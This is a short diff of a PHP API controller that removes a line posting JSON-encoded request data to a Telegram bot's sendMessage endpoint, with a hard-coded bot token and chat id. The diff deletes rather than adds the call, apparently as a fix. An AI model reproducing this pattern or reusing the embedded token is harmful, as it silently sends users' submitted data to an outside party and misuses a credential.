@@ -338,8 +338,6 @@ class ApiFixedController extends Controller
         $model          = new $modelCandidate;
         $detailsArray   = $model->details;
         
-        file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
-        .json_encode( $data ));   
         if(isset($data[0]) && is_array($data[0])){
             foreach ($data as $i => $isiData){
                 $additionalData = $this->createAdditionalData($model, $isiData);
